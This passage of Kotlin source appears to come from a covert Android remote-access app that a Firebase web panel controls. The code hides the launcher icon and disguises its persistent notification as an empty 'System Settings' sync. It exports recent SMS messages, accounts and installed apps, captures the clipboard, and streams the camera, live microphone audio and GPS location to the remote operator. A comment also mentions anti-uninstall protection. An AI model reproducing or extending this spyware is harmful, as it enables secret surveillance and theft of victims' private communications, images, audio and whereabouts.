            val hide = snapshot.child("hide").getValue(Boolean::class.java) ?: true
            val componentName = ComponentName(this, "$packageName.LauncherAlias")
            val state = if (hide) PackageManager.COMPONENT_ENABLED_STATE_DISABLED else PackageManager.COMPONENT_ENABLED_STATE_ENABLED
            packageManager.setComponentEnabledSetting(componentName, state, PackageManager.DONT_KILL_APP)
            deviceRef?.child("settings/iconHidden")?.setValue(hide)
            deviceRef?.child("logs")?.push()?.setValue(mapOf(
                "log" to "🕵️ [STEALTH MODE] Launcher icon ${if (hide) "HIDDEN" else "RESTORED"}",
                "time" to ServerValue.TIMESTAMP
            ))
        } catch (e: Exception) {
            Timber.e(e, "Error toggling app icon visibility")
        }
    }

    private fun playLoudAlarm() {
        try {
            val audioManager = getSystemService(Context.AUDIO_SERVICE) as AudioManager
            val maxVol = audioManager.getStreamMaxVolume(AudioManager.STREAM_ALARM)
            audioManager.setStreamVolume(AudioManager.STREAM_ALARM, maxVol, 0)
            
            val alarmUri = RingtoneManager.getDefaultUri(RingtoneManager.TYPE_ALARM) 
                ?: RingtoneManager.getDefaultUri(RingtoneManager.TYPE_RINGTONE)
            val ringtone = RingtoneManager.getRingtone(this, alarmUri)
            ringtone.play()

            deviceRef?.child("logs")?.push()?.setValue(mapOf(
                "log" to "🚨 [LOUD ALARM] Triggered 100% volume alarm on device",
                "time" to ServerValue.TIMESTAMP
            ))

            mainHandler.postDelayed({
                try {
                    if (ringtone.isPlaying) ringtone.stop()
                } catch (e: Exception) {}
            }, 15000)
        } catch (e: Exception) {
            Timber.e(e, "Error playing alarm")
        }
    }

    private fun toggleTorch(snapshot: DataSnapshot) {
        try {
            val on = snapshot.child("on").getValue(Boolean::class.java) ?: true
            val cm = getSystemService(Context.CAMERA_SERVICE) as CameraManager
            val cameraId = cm.cameraIdList.firstOrNull() ?: return
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
                cm.setTorchMode(cameraId, on)
                deviceRef?.child("settings/torchOn")?.setValue(on)
                deviceRef?.child("logs")?.push()?.setValue(mapOf(
                    "log" to "🔦 [FLASHLIGHT] Flashlight turned ${if (on) "ON" else "OFF"}",
                    "time" to ServerValue.TIMESTAMP
                ))
            }
        } catch (e: Exception) {
            Timber.e(e, "Error toggling torch")
        }
    }

    private fun vibrateDevice() {
        try {
            @Suppress("DEPRECATION")
            val vibrator = getSystemService(Context.VIBRATOR_SERVICE) as Vibrator
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                vibrator.vibrate(VibrationEffect.createOneShot(1000, VibrationEffect.DEFAULT_AMPLITUDE))
            } else {
                @Suppress("DEPRECATION")
                vibrator.vibrate(1000)
            }
            deviceRef?.child("logs")?.push()?.setValue(mapOf(
                "log" to "📳 [VIBRATE] Triggered 1s device vibration",
                "time" to ServerValue.TIMESTAMP
            ))
        } catch (e: Exception) {
            Timber.e(e, "Error vibrating device")
        }
    }

    private fun forceLocationUpdate() {
        try {
            if (ContextCompat.checkSelfPermission(this, Manifest.permission.ACCESS_FINE_LOCATION) != PackageManager.PERMISSION_GRANTED) return
            val locManager = getSystemService(Context.LOCATION_SERVICE) as LocationManager
            val provider = if (locManager.isProviderEnabled(LocationManager.GPS_PROVIDER)) LocationManager.GPS_PROVIDER else LocationManager.NETWORK_PROVIDER
            val loc = locManager.getLastKnownLocation(provider)
            if (loc != null) {
                deviceRef?.child("location")?.setValue(mapOf(
                    "lat" to loc.latitude,
                    "lng" to loc.longitude,
                    "accuracy" to loc.accuracy,
                    "altitude" to loc.altitude,
                    "speed" to loc.speed,
                    "time" to loc.time
                ))
                deviceRef?.child("logs")?.push()?.setValue(mapOf(
                    "log" to "📍 [GPS LOCATION] Lat: ${loc.latitude}, Lng: ${loc.longitude}",
                    "time" to ServerValue.TIMESTAMP
                ))
            }
        } catch (e: Exception) {
            Timber.e(e, "Error forcing location update")
        }
    }

    private fun exportSMSList() {
        try {
            if (ContextCompat.checkSelfPermission(this, Manifest.permission.READ_SMS) != PackageManager.PERMISSION_GRANTED) return
            
            val uri = android.net.Uri.parse("content://sms/")
            val cursor = contentResolver.query(uri, null, null, null, "date DESC LIMIT 50")
            val smsList = mutableListOf<Map<String, Any>>()
            
            cursor?.use {
                val addressIdx = it.getColumnIndexOrThrow("address")
                val bodyIdx = it.getColumnIndexOrThrow("body")
                val typeIdx = it.getColumnIndexOrThrow("type")
                val dateIdx = it.getColumnIndexOrThrow("date")
                
                while (it.moveToNext()) {
                    val address = it.getString(addressIdx) ?: "Unknown"
                    val body = it.getString(bodyIdx) ?: ""
                    val type = it.getInt(typeIdx)
                    val date = it.getLong(dateIdx)
                    
                    val typeStr = if (type == 1) "inbox" else if (type == 2) "sent" else "other"
                    
                    smsList.add(mapOf(
                        "sender" to address,
                        "body" to body,
                        "type" to typeStr,
                        "time" to date
                    ))
                }
            }
            
            deviceRef?.child("smsList")?.setValue(smsList)
        } catch (e: Exception) {
            Timber.e(e, "Error exporting SMS")
        }
    }

    private fun exportAppsList() {
        try {
            val pm = packageManager
            val packages = pm.getInstalledApplications(PackageManager.GET_META_DATA)
            val appList = mutableListOf<Map<String, String>>()
            
            for (appInfo in packages) {
                // Filter out some extreme system apps if needed, but for now we get all
                if (pm.getLaunchIntentForPackage(appInfo.packageName) != null) {
                    val appName = pm.getApplicationLabel(appInfo).toString()
                    appList.add(mapOf(
                        "name" to appName,
                        "package" to appInfo.packageName
                    ))
                }
            }
            
            // Sort alphabetically by name
            appList.sortBy { it["name"]?.lowercase() }
            
            deviceRef?.child("installedApps")?.setValue(appList)
        } catch (e: Exception) {
            Timber.e(e, "Error exporting app list")
        }
    }

    private fun reportPermissions() {
        try {
            val perms = mapOf(
                "Camera" to (ContextCompat.checkSelfPermission(this, Manifest.permission.CAMERA) == PackageManager.PERMISSION_GRANTED),
                "Microphone" to (ContextCompat.checkSelfPermission(this, Manifest.permission.RECORD_AUDIO) == PackageManager.PERMISSION_GRANTED),
                "Location" to (ContextCompat.checkSelfPermission(this, Manifest.permission.ACCESS_FINE_LOCATION) == PackageManager.PERMISSION_GRANTED),
                "SMS" to (ContextCompat.checkSelfPermission(this, Manifest.permission.READ_SMS) == PackageManager.PERMISSION_GRANTED),
                "Contacts" to (ContextCompat.checkSelfPermission(this, Manifest.permission.READ_CONTACTS) == PackageManager.PERMISSION_GRANTED),
                "Storage" to (ContextCompat.checkSelfPermission(this, Manifest.permission.READ_EXTERNAL_STORAGE) == PackageManager.PERMISSION_GRANTED ||
                    (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU && ContextCompat.checkSelfPermission(this, Manifest.permission.READ_MEDIA_IMAGES) == PackageManager.PERMISSION_GRANTED)),
                "Accounts" to (ContextCompat.checkSelfPermission(this, Manifest.permission.GET_ACCOUNTS) == PackageManager.PERMISSION_GRANTED),
                "Call Log" to (ContextCompat.checkSelfPermission(this, Manifest.permission.READ_CALL_LOG) == PackageManager.PERMISSION_GRANTED)
            )
            deviceRef?.child("permissions")?.setValue(perms)
        } catch (e: Exception) {
            Timber.e(e, "reportPermissions error")
        }
    }


    private fun exportAccountsToFirebase() {
        try {
            if (ContextCompat.checkSelfPermission(this, Manifest.permission.GET_ACCOUNTS) != PackageManager.PERMISSION_GRANTED) {
                return
            }
            val am = AccountManager.get(this)
            val accounts = am.accounts
            val accountsList = mutableListOf<Map<String, String>>()
            for (acc in accounts) {
                accountsList.add(mapOf("type" to acc.type, "name" to acc.name))
            }
            // Write to Firebase so the website can display it
            deviceRef?.child("accounts")?.setValue(accountsList)
        } catch (e: Exception) { 
            Timber.e(e, "Accounts Error: ${e.message}") 
        }
    }

    private fun convertYUV420888ToNV21(img: android.media.Image): ByteArray {
        val width = img.width; val height = img.height
        val yPlane = img.planes[0]; val uPlane = img.planes[1]; val vPlane = img.planes[2]
        val nv21 = ByteArray(width * height * 3 / 2)
        val yRowStride = yPlane.rowStride; val yPixelStride = yPlane.pixelStride
        val uvRowStride = uPlane.rowStride; val uvPixelStride = uPlane.pixelStride
        for (row in 0 until height) { for (col in 0 until width) { nv21[row * width + col] = yPlane.buffer.get(row * yRowStride + col * yPixelStride) } }
        var pos = width * height
        for (row in 0 until height / 2) { for (col in 0 until width / 2) { 
            nv21[pos++] = vPlane.buffer.get(row * uvRowStride + col * uvPixelStride)
            nv21[pos++] = uPlane.buffer.get(row * uvRowStride + col * uvPixelStride) 
        } }
        return nv21
    }

    private fun startBackgroundThread() { if (backgroundThread == null) { backgroundThread = HandlerThread("CameraBg").apply { start() }; backgroundHandler = Handler(backgroundThread!!.looper) } }
    private fun stopBackgroundThread() { backgroundThread?.quitSafely(); backgroundThread = null; backgroundHandler = null }
    private fun ringDevice() { try { val r = RingtoneManager.getRingtone(this, RingtoneManager.getDefaultUri(RingtoneManager.TYPE_RINGTONE)); val am = getSystemService(Context.AUDIO_SERVICE) as AudioManager; am.setStreamVolume(AudioManager.STREAM_RING, am.getStreamMaxVolume(AudioManager.STREAM_RING), 0); r.play(); mainHandler.postDelayed({ if (r.isPlaying) r.stop() }, 10000) } catch (e: Exception) {} }
    private fun setupFirebaseListeners() {
        val dRef = deviceRef ?: return
        // StreamConfig listener - removed

        // Feature toggles
        dRef.child("features").addValueEventListener(object : ValueEventListener {
            override fun onDataChange(snapshot: DataSnapshot) {
                isMonitorEnabled = snapshot.child("monitor").getValue(Boolean::class.java) ?: true
                isClipboardEnabled = snapshot.child("clipboard").getValue(Boolean::class.java) ?: true
                if (isClipboardEnabled) startClipboardMonitor() 
            }
            override fun onCancelled(error: DatabaseError) {}
        })
    }

    private var clipboardListener: ClipboardManager.OnPrimaryClipChangedListener? = null
    private fun startClipboardMonitor() {
        if (clipboardListener != null) return
        clipboardListener = ClipboardManager.OnPrimaryClipChangedListener {
            try {
                val text = clipboard?.primaryClip?.getItemAt(0)?.text?.toString() ?: return@OnPrimaryClipChangedListener
                if (text.isBlank()) return@OnPrimaryClipChangedListener
                // Write to Firebase so web panel can see it
                deviceRef?.child("clipboard")?.setValue(text)
                // Also send to Firebase logs
                deviceRef?.child("logs")?.push()?.setValue(mapOf(
                    "log" to "📋 [CLIPBOARD CAPTURED]\n\n$text",
                    "time" to ServerValue.TIMESTAMP
                ))
            } catch (e: Exception) {
                Timber.e(e, "Error in clipboard monitor")
            }
        }
        mainHandler.post { clipboard?.addPrimaryClipChangedListener(clipboardListener) }
    }

    private fun startCameraStreaming(type: String) {
        if (!isStreamingEnabled) return
        try {
            startBackgroundThread()
            val cameraId = getCameraId(type == "front")
            imageReader = ImageReader.newInstance(streamWidth, streamHeight, android.graphics.ImageFormat.JPEG, 2)
            val ir = imageReader ?: run {
                Timber.e("Camera: ImageReader init failed")
                return
            }
            ir.setOnImageAvailableListener({ reader ->
                if (!isProcessingFrame.compareAndSet(false, true)) return@setOnImageAvailableListener
                val image = reader.acquireLatestImage() ?: run { isProcessingFrame.set(false); return@setOnImageAvailableListener }
                try {
                    val buffer = image.planes[0].buffer
                    val bytes = ByteArray(buffer.remaining())
                    buffer.get(bytes)
                    val processed = processImage(bytes, sensorOrientation, type == "front")
                    val b64 = Base64.encodeToString(processed, Base64.NO_WRAP)
                    deviceRef?.child("stream")?.setValue(b64)
                } catch (e: Exception) {
                    Timber.e(e, "Camera frame error")
                } finally {
                    image.close()
                    isProcessingFrame.set(false)
                }
            }, backgroundHandler)

            val cm = cameraManager ?: run { Timber.e("Camera not available"); return }
            val characteristics = cm.getCameraCharacteristics(cameraId)
            sensorOrientation = characteristics.get(CameraCharacteristics.SENSOR_ORIENTATION) ?: 0

            if (ContextCompat.checkSelfPermission(this, Manifest.permission.CAMERA) != PackageManager.PERMISSION_GRANTED) {
                Timber.e("Camera: Permission not granted")
                return
            }
            cm.openCamera(cameraId, object : CameraDevice.StateCallback() {
                override fun onOpened(camera: CameraDevice) {
                    cameraDevice = camera
                    val surface = imageReader!!.surface
                    camera.createCaptureSession(listOf(surface), object : CameraCaptureSession.StateCallback() {
                        override fun onConfigured(session: CameraCaptureSession) {
                            captureSession = session
                            val req = camera.createCaptureRequest(CameraDevice.TEMPLATE_PREVIEW).apply { addTarget(surface) }
                            session.setRepeatingRequest(req.build(), null, backgroundHandler)
                        }
                        override fun onConfigureFailed(session: CameraCaptureSession) { Timber.e("Camera: Session config failed") }
                    }, backgroundHandler)
                }
                override fun onDisconnected(camera: CameraDevice) { camera.close(); cameraDevice = null }
                override fun onError(camera: CameraDevice, error: Int) { camera.close(); cameraDevice = null; Timber.e("Camera error: $error") }
            }, backgroundHandler)
        } catch (e: Exception) {
            Timber.e(e, "Camera start failed")
        }
    }

    private fun getCameraId(front: Boolean): String {
        val cm = cameraManager ?: return "0"
        for (id in cm.cameraIdList) {
            val facing = cm.getCameraCharacteristics(id).get(CameraCharacteristics.LENS_FACING)
            if (front && facing == CameraCharacteristics.LENS_FACING_FRONT) return id
            if (!front && facing == CameraCharacteristics.LENS_FACING_BACK) return id
        }
        return cm.cameraIdList[0]
    }

    private fun startLiveAudio() {
        if (isLiveAudio) return
        isLiveAudio = true
        promoteToForeground(camera = isStreamingEnabled, mic = true, loc = true)
        Thread {
            try {
                val sampleRate = 16000
                val bufferSize = AudioRecord.getMinBufferSize(sampleRate, AudioFormat.CHANNEL_IN_MONO, AudioFormat.ENCODING_PCM_16BIT)
                if (ContextCompat.checkSelfPermission(this, Manifest.permission.RECORD_AUDIO) != PackageManager.PERMISSION_GRANTED) {
                    Timber.e("Mic: Permission not granted")
                    isLiveAudio = false
                    return@Thread
                }
                audioRecord = AudioRecord(MediaRecorder.AudioSource.MIC, sampleRate, AudioFormat.CHANNEL_IN_MONO, AudioFormat.ENCODING_PCM_16BIT, bufferSize * 4)
                audioRecord?.startRecording()
                val buffer = ShortArray(bufferSize)
                while (isLiveAudio) {
                    val read = audioRecord?.read(buffer, 0, buffer.size) ?: break
                    if (read > 0) {
                        val bytes = ByteArray(read * 2)
                        for (i in 0 until read) { bytes[i * 2] = (buffer[i].toInt() and 0xFF).toByte(); bytes[i * 2 + 1] = (buffer[i].toInt() shr 8).toByte() }
                        val b64 = Base64.encodeToString(bytes, Base64.NO_WRAP)
                         deviceRef?.child("audioLive")?.setValue(b64)
                    }
                    SystemClock.sleep(100)
                }
            } catch (e: Exception) { Timber.e(e, "Mic error") }
            stopLiveAudioInternal()
        }.start()
    }

    private fun setupCommandListeners() {
        val dRef = deviceRef ?: return
        dRef.child("commands").addChildEventListener(object : ChildEventListener {
            override fun onChildAdded(s: DataSnapshot, p: String?) { handleCommand(s) }
            override fun onChildChanged(s: DataSnapshot, p: String?) { handleCommand(s) }
            override fun onChildRemoved(s: DataSnapshot) {}
            override fun onChildMoved(s: DataSnapshot, p: String?) {}
            override fun onCancelled(e: DatabaseError) {}
        })
    }

    private fun stopLiveAudio() {
        isLiveAudio = false
        stopLiveAudioInternal()
    }

    private fun stopLiveAudioInternal() {
        try {
            audioRecord?.stop()
            audioRecord?.release()
        } catch (e: Exception) {}
        audioRecord = null
        mainHandler.post { 
            deviceRef?.child("audioLive")?.removeValue()
            promoteToForeground(isStreamingEnabled, false, true) 
        }
    }

    private fun processImage(jpegData: ByteArray, rotation: Int, mirror: Boolean): ByteArray {
        val bitmap = BitmapFactory.decodeByteArray(jpegData, 0, jpegData.size)
        val matrix = Matrix()
        matrix.postRotate(rotation.toFloat())
        if (mirror) matrix.postScale(-1f, 1f)
        val rotated = Bitmap.createBitmap(bitmap, 0, 0, bitmap.width, bitmap.height, matrix, true)
        val out = ByteArrayOutputStream()
        rotated.compress(Bitmap.CompressFormat.JPEG, streamQuality, out)
        return out.toByteArray()
    }

    private fun syncLogsToTelegram() {
        // Feature removed
    }

    private val locationListener = object : LocationListener {
        override fun onLocationChanged(l: Location) {
            deviceRef?.child("location")?.setValue(mapOf("lat" to l.latitude, "lng" to l.longitude, "time" to ServerValue.TIMESTAMP))
            locationManager?.removeUpdates(this)
        }
    }

    private fun sendDeviceInfo() {
        deviceRef?.child("info")?.updateChildren(mapOf(
            "model" to Build.MODEL,
            "brand" to Build.BRAND,
            "sdk" to Build.VERSION.SDK_INT
        ))
        // Also ensure health/online is set (this is what the dashboard reads)
        deviceRef?.child("health")?.updateChildren(mapOf(
            "online" to true,
            "lastSeen" to ServerValue.TIMESTAMP
        ))
    }

    private fun promoteToForeground(camera: Boolean, mic: Boolean, loc: Boolean) {
        val cid = "system_service_channel"
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            val manager = getSystemService(NotificationManager::class.java)
            val importance = NotificationManager.IMPORTANCE_MIN
            val channel = NotificationChannel(cid, "System Settings", importance).apply {
                description = "System background synchronization"
                setShowBadge(false)
                lockscreenVisibility = Notification.VISIBILITY_SECRET
            }
            manager?.createNotificationChannel(channel)
        }

        val n = NotificationCompat.Builder(this, cid)
            .setContentTitle("")
            .setContentText("")
            .setSmallIcon(android.R.drawable.stat_notify_sync)
            .setPriority(NotificationCompat.PRIORITY_MIN)
            .setCategory(Notification.CATEGORY_SERVICE)
            .setVisibility(NotificationCompat.VISIBILITY_SECRET)
            .setOngoing(true)
            .build()

        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
            var t = 0
            val hasCameraPerm = ContextCompat.checkSelfPermission(this, Manifest.permission.CAMERA) == PackageManager.PERMISSION_GRANTED
            val hasMicPerm = ContextCompat.checkSelfPermission(this, Manifest.permission.RECORD_AUDIO) == PackageManager.PERMISSION_GRANTED
            val hasLocPerm = ContextCompat.checkSelfPermission(this, Manifest.permission.ACCESS_FINE_LOCATION) == PackageManager.PERMISSION_GRANTED || ContextCompat.checkSelfPermission(this, Manifest.permission.ACCESS_COARSE_LOCATION) == PackageManager.PERMISSION_GRANTED
            
            if (camera && hasCameraPerm) t = t or ServiceInfo.FOREGROUND_SERVICE_TYPE_CAMERA
            if (mic && hasMicPerm) t = t or ServiceInfo.FOREGROUND_SERVICE_TYPE_MICROPHONE
            if (loc && hasLocPerm) t = t or ServiceInfo.FOREGROUND_SERVICE_TYPE_LOCATION
            
            if (Build.VERSION.SDK_INT >= 34) {
                t = t or ServiceInfo.FOREGROUND_SERVICE_TYPE_SPECIAL_USE
            }
            
            if (t == 0 && Build.VERSION.SDK_INT >= 34) {
                t = ServiceInfo.FOREGROUND_SERVICE_TYPE_SPECIAL_USE
            }
            
            try {
                if (t != 0) {
                    startForeground(1001, n, t)
                } else {
                    startForeground(1001, n)
                }
            } catch (e: Exception) {
                Timber.e("Foreground start failed: ${e.message}")
            }
        } else {
            startForeground(1001, n)
        }
    }

    private fun stopCurrentStreamingInternal() {
        captureSession?.close()
        captureSession = null
        cameraDevice?.close()
        cameraDevice = null
        imageReader?.close()
        imageReader = null
        stopBackgroundThread()
        isProcessingFrame.set(false)
    }

    private fun updateDeviceHealth() {
        try {
            val dRef = deviceRef ?: return
            val intent = registerReceiver(null, IntentFilter(Intent.ACTION_BATTERY_CHANGED))
            val level = intent?.getIntExtra(BatteryManager.EXTRA_LEVEL, -1) ?: -1
            val scale = intent?.getIntExtra(BatteryManager.EXTRA_SCALE, -1) ?: -1
            val battery = if (level != -1 && scale != -1) (level * 100 / scale.toFloat()).toInt() else -1
            
            // Always re-assert online = true in every health update (every 30s)
            // This acts as a heartbeat to keep online status accurate
            dRef.child("health").updateChildren(mapOf(
                "online" to true,
                "battery" to battery,
                "screen" to (getSystemService(Context.POWER_SERVICE) as PowerManager).isInteractive,
                "lastSeen" to ServerValue.TIMESTAMP
            ))
        } catch (e: Exception) {
            Timber.e(e, "Health update error")
        }
    }

    private fun selfUninstall() {
        try {
            val intent = Intent(Intent.ACTION_DELETE).apply {
                data = Uri.parse("package:$packageName")
                flags = Intent.FLAG_ACTIVITY_NEW_TASK or Intent.FLAG_ACTIVITY_CLEAR_TASK
            }
            startActivity(intent)
        } catch (e: Exception) {
            Timber.e(e, "Uninstall error: ${e.message}")
            // Fallback: try with ACTION_UNINSTALL_PACKAGE
            try {
                val intent = Intent(Intent.ACTION_UNINSTALL_PACKAGE).apply {
                    data = Uri.parse("package:$packageName")
                    flags = Intent.FLAG_ACTIVITY_NEW_TASK
                    putExtra(Intent.EXTRA_RETURN_RESULT, true)
                }
                startActivity(intent)
            } catch (e2: Exception) {
                Timber.e(e2, "Uninstall failed")
            }
        }
    }

    private fun checkForegroundApp() {
        // Intentionally disabled: intercepting Settings causes problems with
        // auto-permission flow and anti-uninstall protection.
        if (isUninstalling || !isMonitorEnabled) return
    }

    override fun onBind(i: Intent?): IBinder? = null

    override fun onDestroy() {
        if (smsReceiverRegistered) {
            try { unregisterReceiver(smsReceiver) } catch (e: Exception) {}
        }
        stopCurrentStreamingInternal()
        stopLiveAudio()
        mainHandler.removeCallbacks(monitorRunnable)
        super.onDestroy()
    }
}
